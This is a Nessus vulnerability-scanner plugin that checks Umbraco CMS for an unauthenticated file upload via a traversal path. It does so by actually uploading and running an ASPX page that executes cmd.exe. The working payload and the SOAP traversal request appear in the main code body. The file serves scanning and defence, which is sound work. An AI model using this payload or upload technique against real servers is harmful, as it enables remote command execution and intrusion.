#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(61517);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2017/02/10 22:03:56 $");

  script_bugtraq_id(54351);
  script_osvdb_id(83765);
  script_xref(name:"EDB-ID", value:"19671");

  script_name(english:"Umbraco codeEditorSave.asmx SaveDLRScript Operation Traversal File Upload Arbitrary Command Execution");
  script_summary(english:"Tries to upload a file");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts an application that can be abused to
execute arbitrary code.");
  script_set_attribute(attribute:"description", value:

"The version of Umbraco installed on the remote host allows
unauthenticated remote attackers to upload arbitrary files using the
'SaveDLRScript' SOAP action of the 'codeEditorSave.asmx' script.  In
addition, these files can be stored in a web-accessible location using
encoded traversal strings. 

These issues together allow an attacker to upload a malicious script to
the affected host and use it to execute arbitrary commands, subject to
the privileges under which the web server operates.");
  #http://blog.gdssecurity.com/labs/2012/7/3/find-bugs-faster-with-a-webmatrix-local-reference-instance.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?9bb16c26");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Umbraco CMS Remote Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/07/09");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/09/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/08/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:umbraco:umbraco_cms");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2017 Tenable Network Security, Inc.");

  script_dependencies("umbraco_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/umbraco","www/ASP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80);

install = get_install_from_kb(
  appname      : "umbraco",
  port         : port,
  exit_on_fail : TRUE
);

dir = install["dir"];
vulnerable = FALSE;

payload = '&lt;%@ Page Language="C#" EnableViewState="false" %&gt;\r
&lt;%@ Import Namespace="System.Web.UI.WebControls" %&gt;\r
&lt;%@ Import Namespace="System.Diagnostics" %&gt;\r
&lt;%@ Import Namespace="System.IO" %&gt;\r
&lt;%\r
        string outstr = "";\r
        string dir = Page.MapPath(".") + "/";\r
        if (Request.QueryString["fdir"] != null)\r
        dir = Request.QueryString["fdir"] + "/";\r
        dir = dir.Replace("\\\\", "/");\r
        dir = dir.Replace("//", "/");\r
        Process p = new Process();\r
        p.StartInfo.CreateNoWindow = true;\r
        p.StartInfo.FileName = "cmd.exe";\r
        p.StartInfo.Arguments = "/c ipconfig /all";\r
        p.StartInfo.UseShellExecute = false;\r
        p.StartInfo.RedirectStandardOutput = true;\r
        p.StartInfo.RedirectStandardError = true;\r
        p.StartInfo.WorkingDirectory = dir;\r
        p.Start();\r
        lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();    \r
%&gt;\r
&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;\r
&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;\r
&lt;body&gt;
&lt;pre&gt;&lt;asp:Literal runat="server" ID="lblCmdOut" Mode="Encode"&gt;&lt;/asp:Literal&gt;&lt;/pre&gt;\r
&lt;/body&gt;\r
&lt;/html&gt;\r';

exp_script = (SCRIPT_NAME - ".nasl") + "-" + unixtime() + ".aspx";

exploit = '<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <SaveDLRScript xmlns="http://tempuri.org/">
      <fileName>/..\\..\\..\\umbraco\\' + exp_script + '</fileName>
      <oldName>string</oldName>
      <fileContents>' + payload + '
      </fileContents>
      <ignoreDebugging>1</ignoreDebugging>
    </SaveDLRScript>
  </soap:Body>
</soap:Envelope>';

res = http_send_recv3(
  method : "POST",
  port   : port,
  item   : dir + "/webservices/codeEditorSave.asmx",
  data   : exploit,
  add_headers : make_array("SOAPAction", '"http://tempuri.org/SaveDLRScript"',
  "Content-Type", "text/xml; charset=utf-8")
);
report_req = http_last_sent_request();

if ("<soap:Fault><faultcode>soap:Server</faultcode>" >< res[2])
{
  url = dir + "/" + exp_script;

  res2 = http_send_recv3(
    method          : "GET",
    item            : url,
    port            : port,
    exit_on_fail    : TRUE
  );

  if (
    "Windows IP Configuration" >< res2[2] &&
    "Subnet Mask" >< res2[2]
  )
  {
    vulnerable = TRUE;
    file_url = build_url(port:port, qs:url);
  }
}

if (!vulnerable)
{
  loc = build_url(port:port, qs:dir + "/");
  audit(AUDIT_WEB_APP_NOT_AFFECTED, "Umbraco", loc);
}

report = NULL;
if (report_verbosity > 0)
{
  snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
  report =
    '\nNessus was able to verify the issue exists with the following request : ' +
    '\n' +
    '\n' + file_url +
    '\n' +
    '\n  Note : This file has not been removed and will need to be manually deleted.' +
    '\n';
  if (report_verbosity > 1)
  {
    out_full = strstr(res2[2], "Windows IP Configuration");
    output = ereg_replace(string:out_full, pattern:"<\/(pre|body|html)>", replace:"");

    report +=
      '\nThe file was uploaded by using the following request : ' +
      '\n' +
      '\n' + snip +
      '\n' + report_req +
      '\n' + snip +
      '\n' +
      '\nThe file uploaded to the remote host produced the following output : ' +
      '\n' +
      '\n' + snip +
      '\n' + chomp(output) +
      '\n' + snip +
      '\n';
  }
  security_hole(port:port, extra:report);
  exit(0);
}
else security_hole(port:port);
